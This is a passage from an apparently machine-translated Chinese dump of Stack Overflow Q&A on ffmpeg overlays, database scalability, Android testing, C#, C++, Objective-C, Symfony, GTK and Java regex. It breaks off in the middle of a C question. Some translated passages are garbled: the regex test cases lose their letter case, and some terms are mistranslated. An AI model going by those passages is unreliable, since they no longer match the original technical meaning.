# StackOverflow 问答 12215000-12215999

# video - 将一个视频粘贴到顶层的另一个视频

> ID：12215001
> 
> 赞同：0
> 
> 时间：2012-08-31T12:03:56.693
> 
> 标签：video, encoding, ffmpeg

我有超过 100 多个视频，我需要在每个视频的顶层粘贴一个 5 秒的 avi 视频（例如水印或动画徽标）。它可以用 Adob​​e Premiere 执行，但它太长而且太笨了。我在哪里可以找到很好的框架来处理视频来执行这个（任何语言）？或者任何其他方法来做到这一点？也许'ffmpeg'可以提供帮助？任何帮助、链接、文档都会很棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:21:59.920

不是很清楚你所说的顶层 5 秒 avi 视频是什么意思。我猜你的水印是 5 秒长，100 多个视频是任意长度，你想把第一个放在第二个的某个位置

ffmpeg 有一个覆盖过滤器。：这是文档

将一个视频叠加在另一个视频之上。

它需要两个输入和一个输出，第一个输入是覆盖第二个输入的“主”视频。

它接受参数：x:y[:options]。

x 是主视频上叠加视频的 x 坐标，y 是 y 坐标。x 和 y 是包含以下参数的表达式：

'main_w, main_h'</p>

```
main input width and height 
```

'W，H'</p>

```
same as main_w and main_h 
```

'overlay_w，overlay_h'</p>

```
overlay input width and height 
```

'w，h'</p>

```
same as overlay_w and overlay_h 
```

options 是 key=value 对的可选列表，以“:”分隔。

接受选项的描述如下。

'RGB'</p>

```
If set to 1, force the filter to accept inputs in the RGB color space. Default value is 0\. 
```

请注意，帧是按时间戳顺序从每个输入视频中获取的，因此，如果它们的初始时间戳不同，最好将两个输入通过 setpts=PTS-STARTPTS 过滤器让它们以相同的零时间戳开始，就像电影过滤器的例子一样。

遵循一些示例：

```
# draw the overlay at 10 pixels from the bottom right
# corner of the main video.
overlay=main_w-overlay_w-10:main_h-overlay_h-10 
```

这个对我有用： ffmpeg -i ./external/bb_high.mp4 -i external/small.mp4 -strict -2 -filter_complex 'overlay=10:10' output.mp4

但是 5 秒结束时，我认为最后一帧仍保留在叠加层中。

这是 gstreamer 选项更好的地方。有一个 videomixer 元素可以用来做这种事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-08T22:19:38.883

不使用 ffmpeg，但使用 Expression Encoder，您可以在视频顶部叠加图像或“移动图像”，或者您可以轻松地将两个视频拼接在一起。

[MSDN 链接 - 添加视觉覆盖](http://msdn.microsoft.com/en-us/library/ee341426%28v=expression.30%29.aspx)
[如何视频](http://expression.microsoft.com/en-us/cc460712.aspx)
[MSDN 链接 - 使用 SDK](http://msdn.microsoft.com/en-us/library/gg602440%28v=expression.40%29.aspx)
[Wade Wegner 博客文章](http://www.wadewegner.com/2011/01/overlay-text-on-video-using-expression-encoder-4/)

# database - 为什么关系数据库存在可伸缩性问题？

> ID：12215002
> 
> 赞同：32
> 
> 时间：2012-08-31T12:03:57.430
> 
> 标签：database, relational-database

最近我在网上阅读了一些文章，这些文章表明关系数据库存在扩展问题，并且在涉及大数据时不适合使用。特别是在数据量很大的云计算中。但是通过谷歌搜索，我找不到很好的充分理由来解释为什么它不能很好地扩展。你能解释一下关系数据库在可扩展性方面的局限性吗？

谢谢。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-02T23:09:30.153

想象两种不同的十字路口。

一个有红绿灯或警察在调节交通，十字路口的运动是限速的，还有一个看门狗准确地记录着什么车在十字路口准确地在什么时间开着，朝什么方向行驶。

另一个则没有，每个以他驾驶的速度到达十字路口的人都只是潜入并希望尽快通过。

前者是任何传统的数据库引擎。十字路口是数据本身。汽车是想要访问数据的交易。红绿灯或警察是 DBMS。看门狗保存日志和日志。

后者是 NOACID 类型的发动机。

两者都有一个饱和点，此时到达的汽车被迫开始在入口点排队。两者都具有最大吞吐量。对于前一种十字路口，该阈值较低，原因应该很明显。

然而，前一种十字路口的优势也应该是显而易见的。发生事故的机会更少。在第二种类型的十字路口，只有当交通密度远低于十字路口的理论最大吞吐量时，您才能预计事故不会发生。而在数据管理引擎的转换中，它转换为对一致和连贯结果的保证，只有前一种类型的交叉路口（经典的数据库引擎，无论是关系的还是网络的还是分层的）可以提供。

这个类比可以进一步延伸。想象一下如果发生事故会发生什么。在第二种类型的十字路口，主要关心的可能是尽快清理道路，以便交通可以恢复，完成后，还有哪些信息可以调查谁造成事故以及如何造成事故？什么都没有。不会为人所知。十字路口是开放的，只是等待下一次事故发生。在受管制的十字路口，有警察在指挥交通，他看到了发生的事情并可以作证。有记录表明哪辆车准确地在什么时间进入，准确地在哪个入口点，准确地以什么速度进入，大量的材料可供检查以确定事故的根本原因。但当然，这些都不是免费的。

足够丰富多彩的解释？

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-09-03T09:25:36.700

关系数据库根据[ACID](http://en.wikipedia.org/wiki/ACID)属性提供可靠、成熟的服务。我们获得事务处理、高效的日志记录以实现恢复等。这些是关系数据库的核心服务，也是它们擅长的。它们难以定制，并且可能被视为瓶颈，特别是如果您在给定的应用程序中不需要它们（例如，提供重要性较低的网站内容；例如，在这种情况下，广泛使用的 MySQL 不提供事务使用默认存储引擎处理，因此不满足 ACID）。许多“大数据”问题不需要这些严格的约束，例如网络分析、网络搜索或处理移动对象轨迹，因为它们本质上已经包含了不确定性。

当达到给定计算机的极限时（内存、CPU、磁盘：数据太大，或者数据处理太复杂和成本太高），分发服务是个好主意。许多关系数据库和 NoSQL 数据库都提供分布式存储。然而，在这种情况下，ACID 变得难以满足：[CAP 定理](http://en.wikipedia.org/wiki/CAP_theorem)状态有些相似，即可用性、一致性和分区容错性不能同时实现。如果我们放弃 ACID（例如满足 BASE），可能会增加可扩展性。参见[这篇](http://blog.nahurst.com/visual-guide-to-nosql-systems)文章，例如。用于根据 CAP 对存储方法进行分类。

另一个瓶颈可能是灵活而聪明的类型关系模型本身与 SQL 操作：在许多情况下，具有更简单操作的更简单模型就足够且更有效（如无类型键值存储）。常见的逐行物理存储模型也可能会受到限制：例如，它不是数据压缩的最佳选择。

然而，由于关系数据库技术已经成熟、经过充分研究和广泛使用，因此存在快速且可扩展的符合 ACID 的关系数据库，包括像[VoltDB这样的新数据库。](http://en.wikipedia.org/wiki/VoltDB)我们只需要为给定的问题选择一个合适的解决方案。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T12:07:15.343

举个最简单的例子：用生成的 ID 插入一行。由于 ID 在表中必须是唯一的，因此数据库必须以某种方式锁定某种持久计数器，以便其他 INSERT 不会使用相同的值。所以你有两个选择：要么只允许一个实例写入数据，要么拥有分布式锁。这两种解决方案都是一个主要的瓶颈 - 并且是最简单的例子！

# android - 安卓应用的TDD

> ID：12215003
> 
> 赞同：0
> 
> 时间：2012-08-31T12:04:02.263
> 
> 标签：android, unit-testing, tdd

我需要一些与 Android 应用程序的 TDD 相关的建议和指导

我正在开发一个复杂的 android 应用程序（用于网络游戏的自动机器人播放器）。现在我有一个试点，在开始继续开发之前，我想为它制作完整的 TDD。

此应用程序的主要目的是作为与 http 服务器通信的后台服务运行 - 它将发送带有 json 内容的 http 请求

它有两种运行模式：

```
- service mode - it will run in background- read some data configuration from database and communicate with the server 
- GUI mode - communication with server on demand + configuration for running in service mode. 
```

GUI 层被设计为 MVP，因此在一个模块（MVP 单元）中完成的所有业务都与视图分离，因此，所有应用程序逻辑都是“非 android 依赖”。

我有几个大层需要对其进行单元测试：

```
- domain data access : 
      database storage (ormlite)
      android specific storage - shared prefs.., 
      files
- server communication - http client (spring android rest template)
                         http content conversion (gson)

- background services - android services
- GUI - activities
- app business - android independent - algorithms, computations, ... 
```

总之，将需要 TDD - 对这些层中的每一层单独进行测试，还需要对完整流程进行集成测试。

测试包括：

```
 - database DAO tests
  - http client requests 
  - GSON conversion TDDs
  - business logic - simple tests for methods
  - unit testsfor running and scheduled background services
  - activity unit testing
  - test suites (service + DAO + json conversion + http requests) 
```

我的第一个问题是哪种 TDD 框架最适合我的需求？我应该使用模拟还是不使用？

请给我一些方向。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T15:18:50.307

首先，用于自动测试：[junit](http://www.junit.org/)。

* * *

对于流畅的断言，您可以查看[fest-assertions](https://github.com/nicstrong/fest-assertions-android)。[他们在这里](https://github.com/joel-costigliola/fest-examples/tree/master/src/main/java/org/fest/assertions/examples)提供了很多示例。但是在以下位置享受这个`String`：

```
 assertThat("Frodo").startsWith("Fro").endsWith("do").hasSize(5); 
```

它不仅和谐，还能提高您的工作效率。

* * *

由于您想编写单元测试，因此您必须编写`mock`对象。当然，你可以在没有任何框架的情况下做到这一点，但它**非常** `tedious`.

个人而言，我是[Mockito](http://code.google.com/p/mockito/)的忠实粉丝。它的api很棒而且非常流畅。此外，您可以使用[BDDMockito](http://docs.mockito.googlecode.com/hg/org/mockito/BDDMockito.html)静态方法以[BDD](http://dannorth.net/introducing-bdd/)方式编写测试。看 ：

```
//given  
given(seller.askForBread()).willReturn(new Bread());
//when
Goods goods = shop.buyBread();
//then
assertThat(goods, containBread()); 
```

有时你会依赖于你不能模拟的类，例如`final class`like [`BluetoothAdapter`](http://developer.android.com/reference/android/bluetooth/BluetoothAdapter.html)。在这些情况下（并且仅在这些情况下），您可以使用[`PowerMock`](http://code.google.com/p/powermock/).

也看看这个东西：

*   [https://stackoverflow.com/questions/2336488/resources-for-tdd-on-android](https://stackoverflow.com/questions/2336488/resources-for-tdd-on-android)
*   [为什么 Android 还没有为 TDD 做好准备，以及我是如何尝试的]( [http://daverog.wordpress.com/2009/12/14/why-android-isnt-ready-for-tdd-and-how-i -无论如何都试过/](http://daverog.wordpress.com/2009/12/14/why-android-isnt-ready-for-tdd-and-how-i-tried-anyway/)）
*   [Android 测试简介](http://dtmilano.blogspot.fr/2011/08/linuxcon-2011-north-america.html)

还有一本书：[Android应用测试指南](http://www.packtpub.com/android-application-testing-guide/book)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T15:29:21.053

既然您提到了集成测试，您可能还会对[RoboGherk](https://github.com/leandog/RoboGherk)作为[我的朋友在 LeanDog 的朋友最近宣布的](https://twitter.com/angelaharms/status/240893844365901824)Android 自动化验收测试框架感兴趣。

# .htaccess - Magento 崩溃 .htaccess

> ID：12215005
> 
> 赞同：0
> 
> 时间：2012-08-31T12:04:07.720
> 
> 标签：.htaccess, magento

我在 godaddy 的共享托管计划中安装了 Magento，它一直在崩溃，我认为这是因为 .htaccess 文件。我的 htaccess 文件是[http://pastebin.com/qUs1SDL3](http://pastebin.com/qUs1SDL3)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T17:15:49.910

不要在共享主机上安装 Magento 并期望它能够工作，尤其是 GoDaddy。

[http://www.magentocommerce.com/system-requirements](http://www.magentocommerce.com/system-requirements)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:27:16.883

是的，将 key_buffer 和 max_allowed_pa​​cket 设置为 16M 通常可以解决这个问题

# c#-4.0 - 泛型类的自定义泛型列表

> ID：12215006
> 
> 赞同：1
> 
> 时间：2012-08-31T12:04:08.567
> 
> 标签：c#-4.0, generic-list, generics

我有一堂课

```
public class ID_Name<T>
{
    public ID_Name(T id)
    {
        this.ID = id;
    }

    public T ID { get; set; }

    public string Name
    {
        get 
        {
            return Helper.SomeReturnValue;            
        }
    }
} 
```

我要做的就是生成一个自定义 ID_Name 列表，我可以在其中将 ID_Name.ID 作为参数传递给 Add。我尝试了以下方法：

```
public class ID_Name_List<T> : IList<T> where T : ID_Name<T> 
```

但后来我收到以下错误：

> 类型“EProtokollStatus”不能用作泛型类型或方法“ID_Name_List<\T>”中的类型参数“T”。ID_Name<\EProtokollStatus> 中的“EProtokollStatus”没有装箱转换或类型参数转换。

我在这里读到了一些关于这个问题的内容：[No boxing or type parameter conversion for generic Type parameter](https://stackoverflow.com/questions/11823608/no-boxing-or-type-parameter-conversion-for-generic-type-parameter)但我在这里看不到除 ID_Name 之外的限制。不知何故，这可能是错误的，因为我想要表达的一切都是“使用与 ID_Name 中相同的类型 T 作为 ID_Name_List”，但我该如何实现呢？

我在这里找到了一些东西：[C#：声明和使用具有不同类型的泛型类列表，如何？](https://stackoverflow.com/questions/590540/c-declaring-and-using-a-list-of-generic-classes-with-different-types-how)但我不想为所有可能的类型创建许多不同的类。

我想要实现的只是

```
ID_Name_List<EProtokollStatus> myList = new ID_Name_List<EProtokollStatus>();
myList.Add(EProtokollStatus.ValueX); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:11:56.930

您当前的约束没有意义。你的意思是：

```
public class ID_Name_List<T> : IList<ID_Name<T>> 
```

# python - 通过 PySide 使用 Python 2.7 检索笔压

> ID：12215008
> 
> 赞同：1
> 
> 时间：2012-08-31T12:04:12.617
> 
> 标签：python, qt, python-2.7, pyside

我正在将 Python 2.7 与 PySide 一起使用，并希望使用[它](http://www.pyside.org/docs/pyside/PySide/QtGui/QTabletEvent.html#PySide.QtGui.QTabletEvent)从我的 wacom 笔中检索笔压力。

所以我尝试设置以下

```
import PySide
from PySide import QtCore, QtGui
pressure = PySide.QtGui.QTabletEvent.pressure()
print pressure 
```

这引发了以下错误

```
pressure = PySide.QtGui.QTabletEvent.pressure()
TypeError: descriptor 'pressure' of 'PySide.QtGui.QTabletEvent' object needs an argument 
```

它需要的对象是“PySide.QtGui.QTabletEvent”对象。但我不知道如何检索这样的对象。

所以我的问题是，如何使用 QTabletEvent 检索 wacom 笔压？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:09:56.197

您需要接收实际事件并从中获取`pressure`。

例子：

```
import sys
from PySide import QtCore, QtGui

class MyWidget(QtGui.QWidget):
    def tabletEvent(self, e):
        print(e.pressure())

app = QtGui.QApplication(sys.argv)
widget = MyWidget()
widget.show()
app.exec_() 
```

# c++ - 具有键 = 对的多图

> ID：12215011
> 
> 赞同：1
> 
> 时间：2012-08-31T12:04:18.390
> 
> 标签：c++, stl, map

我有一个`multimap<pair<string,string>,vector> > mmap;` ，我想用两个循环迭代它：

1.  在键的第一个元素上：`key.first`
2.  然后`key.second`

该`equal_range`方法在这种情况下有效吗？怎么写？

```
 pair<multimap<pair<string,string>,vector>::iterator,
 multimap<pair<string,string>,vector>::iterator> key_range = mmap.equal_range( ?? ); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:09:21.610

`multimap`仅支持单个排序，`pair`默认情况下，这将是两个元素的字典顺序：

```
(A, A) (A, B) ... (A, Z) (B, A) (B, B) ... (B, Z) ... (Z, A) ... (Z, Z) 
```

如果您需要通过两个不同的键进行索引，最好使用另一个容器，例如[Boost.MultiIndex](http://www.boost.org/doc/libs/1_51_0/libs/multi_index/doc/index.html)。您可以自己实现相同的效果，例如，将项目存储在 a 中`list`并保存从键到列表迭代器的映射：

```
list<vector> items;
map<string, list<vector>::iterator> index1;
map<string, list<vector>::iterator> index2; 
```

# iphone - 使用 NSSetUncaughtExceptionHandler 在 Objective C 中注册 UncaughtExceptionHandler

> ID：12215012
> 
> 赞同：5
> 
> 时间：2012-08-31T12:04:19.563
> 
> 标签：iphone, objective-c, ios, c, xcode

我注册未捕获异常处理程序的代码`UncaughtExceptionHandler`如下，你认为会有什么潜在的问题吗？

```
@interface AppDelegate ()

void myHandler(NSException * exception);

@end

@implementation AppDelegate

void myHandler(NSException * exception)
{
  // ...
}

- (BOOL) application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    NSSetUncaughtExceptionHandler(&myHandler);
.. 
```

是否有可能有更简洁的方式来编写它？

我需要使用类扩展来声明原型，以摆脱**No previous prototype for function 的警告。**

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-31T13:36:25.633

马丁的回答是正确的。但是，我想我会详细说明一下，以解释为什么会这样。

您的函数定义：

```
void myHandler(NSException * exception)
{
  // ...
} 
```

定义一个外部可见的函数。换句话说（广义的、非技术性的），将在目标文件中创建一个符号，以便链接器可以找到它，从而允许其他文件调用`myHandler`.

但是，因为它应该是外部可见的，所以其他文件将不得不知道该函数的外观。这就是原型发挥作用的地方。警告基本上是说...

> 嘿，您已声明此函数对其他代码在外部可见，但我没有看到其他代码可以用来了解该函数的原型。

因此，您会收到警告。这是一个很好的警告。它可以帮助您记住为要导出的函数声明原型。

现在，正如您所发现的，您可以声明一个原型，警告就会消失。但是，仅在实现文件中声明原型应该是对您的另一个警告。个人警告应该是：

你真的希望这个函数具有外部可见性，还是只是在这个编译单元中调用它？如果函数不具有外部可见性，则不需要将其导出到符号表中，也不需要其他模块可以包含的原型以便他们了解该函数。

`static`在这种情况下，您可以按照 Martin 的响应声明该函数：

```
static void myHandler(NSException * exception)
{
  // ...
} 
```

在这种情况下，`static`告诉编译器类似：

> 嘿，编译器，为这个函数创建代码，并允许这个编译单元中的任何代码看到这个函数，但不要给它外部可见性。我不希望该函数被其他模块调用。

在这种情况下，即使其他代码声明了原型，他们也不会看到您的函数，因为它对于定义它的文件是“私有的”。

由于它仅在本地文件中使用，因此不需要原型，因此无需警告您没有原型。

现在，就像一个注释......您不需要将 C 函数放在代码的 @interface 和 @implementation 部分中，因为这没有任何作用。这些 C 函数在编译时具有完全相同的可见性和访问权限，无论它们是否位于 ObjC 部分中。

最后，如果您愿意，您可以在 Xcode 构建设置中禁用此警告（但既然您了解了警告的上下文，我建议您将其保留）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T12:44:22.157

如果将函数声明为：则不会收到有关缺少原型的警告`static`：

```
static void myHandler(NSException * exception)
{
  // ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:40:01.387

是的，这是正确的方法。我只是想知道为什么你会收到警告，因为我有同样的事情而没有在空类别中声明它并且我没有收到警告......此外，您还可以将信号处理程序设置为 catch和`SIGABRT`信号：`SIGILL``SIGBUS`

```
void signalHandler(int sig) {

}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    struct sigaction newSignalAction;
    memset(&newSignalAction, 0, sizeof(newSignalAction));
    newSignalAction.sa_handler = &signalHandler;
    sigaction(SIGABRT, &newSignalAction, NULL);
    sigaction(SIGILL, &newSignalAction, NULL);
    sigaction(SIGBUS, &newSignalAction, NULL);
    ...
} 
```

# php - Symfony2：创建事件监听器：语法错误，意外'-'，期待'（'

> ID：12215015
> 
> 赞同：0
> 
> 时间：2012-08-31T12:04:25.923
> 
> 标签：php, symfony

我已经实现了[“**如何创建事件监听器**”](http://symfony.com/doc/current/cookbook/service_container/event_listener.html)来捕获和处理我的应用程序抛出的所有异常。

但是，当我转到主页时，我收到了这个错误（来自 apache 日志）：

在生产模式下（app.php）：

> 语法错误，意外'-'，期待'(' appProdProjectContainer.php 第 383 行

在开发中。模式（app_dev.php）：

> 语法错误，意外的“-”，在第 1131 行的 appDevDebugProjectContainer.php 中预期为“（”

我用谷歌搜索，但我没有找到可以解决我的问题的东西......

所以，在这里，我的*services.yml*由“DependencyInjection/lhnbackendExtension”类加载：

```
services:
    kernel.listener.lhn-exception:
        class: lhn\backendBundle\Listener\LhnExceptionListener
        tags:
            - { name: kernel.event_listener, event: kernel.exception, method: onKernelException } 
```

--> 我尝试在 XML 文件中配置服务，但出现同样的错误...

以及基本的监听器实现：

```
namespace lhn\backendBundle\Listener;

use Symfony\Component\HttpKernel\Event\GetResponseForExceptionEvent;
use Symfony\Component\HttpFoundation\Response;

class LhnExceptionListener
{
    public function onKernelException(GetResponseForExceptionEvent $event){
        // We get the exception object from the received event
        $exception = $event->getException();
        $message = 'My Error says: ' . $exception->getMessage();

        // Customize our response object to display our exception details
        $response = new Response();
        $response->setContent($message);
        $response->setStatusCode($exception->getStatusCode());

        // Send our modified response object to the event
        $event->setResponse($response);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:10:30.253

尽量不要在服务名称中使用连字符。

```
services:
    kernel.listener.lhn-exception:    
    ... 
```

变成：

```
services:
    kernel.listener.lhn_exception:    
    ... 
```

# python - 在组合框下拉菜单中显示日历

> ID：12215019
> 
> 赞同：1
> 
> 时间：2012-08-31T12:04:47.130
> 
> 标签：python, gtk, pygtk

我希望能够从组合框中的日历中选择一个日期。
此处给出的答案[在菜单中显示 gtk.Calendar？](https://stackoverflow.com/questions/11132929/showing-a-gtk-calendar-in-a-menu)不满足我，因为使用自定义单元格渲染器似乎可以做得更好，如下所示： http://faq.pygtk.org/index.py?req=show& [file=faq13.056.htp](http://faq.pygtk.org/index.py?req=show&file=faq13.056.htp) 但我不是能够正确使用渲染器。

下面的代码向您展示了我所拥有的，但它只是提供了一个组合框，其中没有任何内容，也没有下拉菜单。

我是否必须将组合框信号连接到 CellRendererDate 类的 do_start_editing 函数？（然后如何？）或缺少什么？

```
class MyWindow(gtk.Window):

....

  liststore=gtk.ListStore(str)
  cell=CellRendererDate()
  cell.set_property('editable',True)
  combo=gtk.ComboBox(liststore)
  combo.pack_start(cell, True)
  combo.add_attribute(cell, 'text', 0)

....

class CellRendererDate(gtk.CellRendererText): # code from the pygtk FAQ, linked above

  __gtype_name__ = 'CellRendererDate'

  def __init__(self):
    gtk.CellRendererText.__init__(self)
    self.date_format = '%d/%m/%Y'
    self.calendar_window = None
    self.calendar = None

  def _create_calendar(self, treeview):
    self.calendar_window = gtk.Dialog(parent=treeview.get_toplevel())
    self.calendar_window.action_area.hide()
    self.calendar_window.set_decorated(False)
    self.calendar_window.set_property('skip-taskbar-hint', True)

    self.calendar = gtk.Calendar()
    self.calendar.display_options(gtk.CALENDAR_SHOW_DAY_NAMES | gtk.CALENDAR_SHOW_HEADING)
    self.calendar.connect('day-selected-double-click', self._day_selected, None)
    self.calendar.connect('key-press-event', self._day_selected)
    self.calendar.connect('focus-out-event', self._selection_cancelled)
    self.calendar_window.set_transient_for(None) # cancel the modality of dialog
    self.calendar_window.vbox.pack_start(self.calendar)

    # necessary for getting the (width, height) of calendar_window
    self.calendar.show()
    self.calendar_window.realize()

  def do_start_editing(self, event, treeview, path, background_area, cell_area, flags):
    if not self.get_property('editable'):
      return

    if not self.calendar_window:
      self._create_calendar(treeview)

    # select cell's previously stored date if any exists - or today
    if self.get_property('text'):
      date = datetime.datetime.strptime(self.get_property('text'), self.date_format)
    else:
      date = datetime.datetime.today()
      self.calendar.freeze() # prevent flicker
      (year, month, day) = (date.year, date.month - 1, date.day) # datetime's month starts from one
      self.calendar.select_month(int(month), int(year))
      self.calendar.select_day(int(day))
      self.calendar.thaw()

      # position the popup below the edited cell (and try hard to keep the popup within the toplevel window)
      (tree_x, tree_y) = treeview.get_bin_window().get_origin()
      (tree_w, tree_h) = treeview.window.get_geometry()[2:4]
      (calendar_w, calendar_h) = self.calendar_window.window.get_geometry()[2:4]
      x = tree_x + min(cell_area.x, tree_w - calendar_w + treeview.get_visible_rect().x)
      y = tree_y + min(cell_area.y, tree_h - calendar_h + treeview.get_visible_rect().y)
      self.calendar_window.move(x, y)

      response = self.calendar_window.run()
      if response == gtk.RESPONSE_OK:
        (year, month, day) = self.calendar.get_date()
        date = datetime.date(year, month + 1, day).strftime (self.date_format) # gtk.Calendar's month starts from zero
        self.emit('edited', path, date)
        self.calendar_window.hide()
      return None # don't return any editable, our gtk.Dialog did the work already

  def _day_selected(self, calendar, event):
    # event == None for day selected via doubleclick
    if not event or event.type == gtk.gdk.KEY_PRESS and gtk.gdk.keyval_name(event.keyval) == 'Return':
      self.calendar_window.response(gtk.RESPONSE_OK)
        return True

  def _selection_cancelled(self, calendar, event):
    self.calendar_window.response(gtk.RESPONSE_CANCEL)
    return True 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T04:34:13.103

检查 Kiwi 的 DateEntry：

[http://doc.stoq.com.br/api/kiwi/_modules/kiwi/ui/dateentry.html](http://doc.stoq.com.br/api/kiwi/_modules/kiwi/ui/dateentry.html)

# c++ - 通过非限定名称引用类函数

> ID：12215024
> 
> 赞同：0
> 
> 时间：2012-08-31T12:05:16.950
> 
> 标签：c++

假设我们有一个这样的类函数：

```
class foo {
    // Private data needs to be accessed by bar
public:
    static int bar();
};

int main(int argc, char** argv) {
    // Want to write bar() instead of foo::bar()
    bar();
} 
```

`using`似乎不适用于将类成员导入全局范围，如果`bar`将其设为全局函数，它将无法访问私有数据。有没有办法`bar`可以通过非限定名称在全局范围内访问？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:19:38.957

```
int bar()
{
    return foo::bar(); 
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:21:04.740

您必须在`foo::bar` *某处*写，但可以将其隐藏在函数中。

```
int bar()
{ return foo::bar(); }

int main(int argc, char** argv) {
     // Want to write bar() instead of foo::bar()
     bar();
 } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T14:39:46.710

[这就是`friend`s 的用途。](http://www.youtube.com/watch?v=EtGF2m102Wg)

```
class foo {
    int i;
    // Private data needs to be accessed by bar
public:
    friend int bar(foo);
};

int bar(foo f) {
    return f.i = 3;
}

int main(int argc, char** argv) {
    foo g;
    // Want to write bar() instead of foo::bar()
    bar(g);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:33:05.043

正如其他人所说，存根全局函数。或者一个宏：

```
#define bar foo::bar 
```

没有像 C# 那样导入命名空间的真正方法`using`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T12:28:31.583

把静态的东西分解`foo`出来，因为它无论如何都不属于一个类。类和命名空间之间唯一的功能区别是您可以实例化一个类。由于您显然不需要它（因为您使用的是静态成员函数），您也可以更改`foo`为：

```
namespace foo {
    class fooData { // optional, if you must hide the private data
      friend int bar();
      // Private data needs to be accessed by bar
    };
    int bar();
};

using foo::bar; 
```

# java - 大写单词和字符 java 匹配

> ID：12215025
> 
> 赞同：1
> 
> 时间：2012-08-31T12:05:18.033
> 
> 标签：java, regex

我无法使用简单的正则表达式，现在我有以下 java 代码

```
String regex = "^([^A-Za-z]*?[A-Z][A-Za-z]*?)+.?";
String string = "AQUA, CETEARYL ALCOHOL, CETYL ESTERS, BEHENTRIMONIUM CHLORIDE, CETRIMONIUM CHLORIDE, AMODIMETHICONE, TRIDECETH-12, PARFUM, METHYLPARABEN, HEXYL CINNAMAL, LINALOOL, BENZYL SALICYLATE, LIMONENE, LAMINARIA DIGITATA, CHAMOMILLA RECUTITA , ANICOZANTHOS FLAVIDUS, SODIUM BENZ0ATE, PHENOXYETHANOL, ETHYLPARABEN, BUTYLPARABEN, PROPYLPARABEN, P0LYS0RBATE 20, CI 19140, CI 14700.";
System.out.println(string.matches(regex)); 
```

问题是执行永远不会结束。请仅使用我的正则表达式来查看我是如何失败的。我需要的东西对我来说听起来很简单： - 可以有任何文本。- 本文中的所有单词都应大写。- 如果有单个字符，它们也应该是大写的。- （数字、逗号、...）之间的任何内容都应始终匹配。请参阅上面的复杂示例。简单的是：

```
测试，测试，测试 = 真
测试，测试，测试 = 假
测试，7-测试测试，测试 = true
测试，7-测试测试，测试 = 假
na = 假
不适用 = 真
不适用 = 真
苯氧乙醇, P0LYS0RBATE 20, CI 19140, CI 14700\. = true

```

非常感谢！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:06:45.353

这似乎适用于您提供的所有输入：

```
"^((^|[^A-Za-z]+)[A-Z][A-Za-z]*)*[^A-Za-z]*$" 
```

我不确定您的验证器是如何工作的，但是通过在两端添加`^`and符号来强制匹配整个字符串并没有什么坏处。`$`

您的正则表达式永远不会终止，因为您使用了太多`*`（匹配零个或更多）组，这使得状态空间爆炸。`+`请注意我如何在组上使用 a `[^A-Za-z]`，这会强制它在匹配组之间匹配至少一个非字母。这将匹配的数量保持在合理的数量。但是，由于我的匹配一个完整的字符串（它以 开头`^`和结尾`$`）它无论如何只能找到一个匹配项。

***编辑：***

如果您不希望空字符串匹配，则将倒数第二个更改`*`为 a `+`：

```
"^((^|[^A-Za-z]+)[A-Z][A-Za-z]*)+[^A-Za-z]*$" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:33:30.967

这可能对你有用

字符串正则表达式 = "^([A-Z0-9]+[A-Za-z0-9,./\-] *\s* )+$";

您可能需要添加更多分隔符（示例中为,./ 和 -）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:35:10.140

也许这个正则表达式适合你：

```
\p{Upper}*[^\p{Lower}]*\p{Upper}* 
```

它的意思是：

\p{Upper} 任何大写字符

[^\p{Lower}] 除小写字符外的任何字符

obs：空文本也将匹配

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:30:12.123

你最好使用分隔符，例如使用 stringtokenizer 然后检查，它会容易得多。使用“，”作为分隔符，然后修剪每个标记并使用正则表达式检查。

# c - 显然我正在破坏堆栈 - 但是如何？

> ID：12215026
> 
> 赞同：7
> 
> 时间：2012-08-31T12:05:25.350
> 
> 标签：c, matlab, segmentation-fault

我有一个非常简单的程序，如下所列，它从`.mat`文件（来自 Matlab 的数据文件）中读取一个值并打印出来。出于某种原因，*退出 main() 后*出现段错误- 我可以运行`gdb my_program`并单步执行整个方法，但一旦完成，我在 Matlab 相关库（的依赖项）中`main()`输入一些方法，该方法会引发段错误.`libmwfl.so``libmat.so`

我对 C 编程完全陌生，但有些阅读我怀疑我要么以某种方式[破坏了堆栈](https://stackoverflow.com/a/4807923/38055)，要么[两次调用了一些析构函数](https://stackoverflow.com/a/5059855/38055)。但是，我在我的代码中看不到任何这些 - 正如我所说，我可以使用调试器单步执行我的代码而不会出现问题。

我在这里做错了什么？

```
#include <stdlib.h>
#include <stdio.h>
#include <mat.h>

int main(int argc, char *argv[]) {

    double value;
    MATFile *datafile;
    datafile = matOpen("test.mat", "r");

    mxArray *mxv;
